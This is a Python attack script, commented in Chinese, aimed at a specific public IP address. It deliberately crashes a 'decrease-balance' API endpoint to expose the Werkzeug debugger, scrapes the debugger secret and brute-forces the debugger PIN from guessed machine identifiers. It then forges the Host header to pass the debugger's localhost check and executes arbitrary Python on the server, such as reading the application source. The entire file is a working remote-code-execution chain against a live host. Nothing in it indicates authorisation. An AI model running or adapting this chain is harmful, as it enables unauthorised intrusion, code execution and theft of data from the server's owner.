#!/usr/bin/env python3
"""
Werkzeug Debugger PIN 破解 + RCE 链 (Host 头绕过)

发现: pinauth/printpin/execute 仅信任 Host 为 127.0.0.1 / localhost
      远程攻击需设置: Host: 127.0.0.1:9110

用法:
  python3 tools/pin_rce_chain.py --crack    # 计算 PIN 候选并测试
  python3 tools/pin_rce_chain.py --exec 'print(open("/home/试试看洋芋的新的查具体后台/app.py").read()[:500])'

注意: 服务端 pinauth 失败 >10 次会 exhausted=True，需等待 worker 重启后再试。
"""
from __future__ import annotations

import argparse
import hashlib
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from itertools import chain

MAIN = "http://43.154.128.116:9110"
PATH = "/api/desktop/decrease-balance"
APP_PY = "/home/试试看洋芋的新的查具体后台/app.py"
TRUSTED_HOST = "127.0.0.1:9110"


def pin_from_bits(public: list, private: list) -> str:
    h = hashlib.sha1()
    for bit in chain(public, private):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]
    for gs in (3, 4, 5):
        if len(num) % gs == 0:
            return "-".join(num[i : i + gs] for i in range(0, 9, gs))
    return num


def trigger_debug() -> tuple[str, list[str]]:
    req = urllib.request.Request(
        MAIN + PATH,
        data=json.dumps({"username": "test", "amount": "NaN"}).encode(),
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    try:
        urllib.request.urlopen(req, timeout=12)
        raise RuntimeError("expected 500 debugger")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
    secret = re.search(r'SECRET = "([^"]+)"', body).group(1)
    frames = re.findall(r'id="(frame-\d+)"', body)
    app_frame = None
    for m in re.finditer(
        r'id="(frame-\d+)".*?app\.py".*?line <em class="line">(\d+)</em>.*?function">([^<]+)',
        body,
        re.S,
    ):
        app_frame = m.group(1).replace("frame-", "")
    return secret, frames, app_frame, body


def pinauth(pin: str, secret: str, cookie: str = "") -> tuple[dict, str]:
    url = f"{MAIN}{PATH}?__debugger__=yes&cmd=pinauth&pin={urllib.parse.quote(pin)}&s={secret}"
    headers = {"Host": TRUSTED_HOST}
    if cookie:
        headers["Cookie"] = cookie
    req = urllib.request.Request(url, headers=headers)
    r = urllib.request.urlopen(req, timeout=10)
    return json.loads(r.read()), r.headers.get("Set-Cookie", "")


def execute(code: str, secret: str, frame_id: str, cookie: str) -> str:
    q = urllib.parse.urlencode({"__debugger__": "yes", "cmd": code, "frm": frame_id, "s": secret})
    url = f"{MAIN}{PATH}?{q}"
    req = urllib.request.Request(url, headers={"Host": TRUSTED_HOST, "Cookie": cookie})
    r = urllib.request.urlopen(req, timeout=15)
    return r.read().decode("utf-8", "replace")


def gen_candidates() -> list[str]:
    root = "/home/试试看洋芋的新的查具体后台"
    app = root + "/app.py"
    users = ["root", "www-data", "ubuntu", "admin"]
    mods = [("app", "app", app), ("__main__", "app", app)]
    macs = [0, 1] + list(range(0x000C29000000, 0x000C29000010))
    mids: list = ["", b""]
    for s in ("43.154.128.116", "ubuntu", "TencentOS", "VM-0-16-ubuntu"):
        mids.extend([s.encode(), hashlib.md5(s.encode()).hexdigest().encode()])

    pins: list[str] = []
    seen: set[str] = set()
    for user in users:
        for modname, cls, mfile in mods:
            public = [user, modname, cls, mfile]
            for mac in macs:
                for mid in mids:
                    pin = pin_from_bits(public, [str(mac), mid])
                    if pin not in seen:
                        seen.add(pin)
                        pins.append(pin)
    return pins


def crack(max_tries: int = 8) -> tuple[str, str, str, str] | None:
    secret, frames, app_frame, _ = trigger_debug()
    print(f"debugger secret={secret} app_frame={app_frame}")
    cookie = ""
    for i, pin in enumerate(gen_candidates()[:max_tries]):
        res, set_cookie = pinauth(pin, secret, cookie)
        print(f"[{i}] pin={pin} -> {res}")
        if set_cookie:
            cookie = set_cookie.split(";")[0]
        if res.get("auth"):
            print(f"PIN OK: {pin}")
            return pin, secret, app_frame or frames[-1].replace("frame-", ""), cookie
        if res.get("exhausted"):
            print("exhausted — wait for worker restart")
            return None
        time.sleep(0.55)
    return None


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--crack", action="store_true")
    ap.add_argument("--exec", metavar="CODE")
    ap.add_argument("--pin", help="known PIN")
    args = ap.parse_args()

    if args.crack:
        hit = crack()
        if not hit:
            sys.exit(1)
        pin, secret, frame, cookie = hit
        print("cookie", cookie)
        if args.exec:
            print(execute(args.exec, secret, frame, cookie))
        return

    if args.exec and args.pin:
        secret, _, app_frame, _ = trigger_debug()
        _, cookie_hdr = pinauth(args.pin, secret)
        cookie = cookie_hdr.split(";")[0] if cookie_hdr else ""
        frame = app_frame or "0"
        print(execute(args.exec, secret, frame, cookie))
        return

    ap.print_help()


if __name__ == "__main__":
    main()
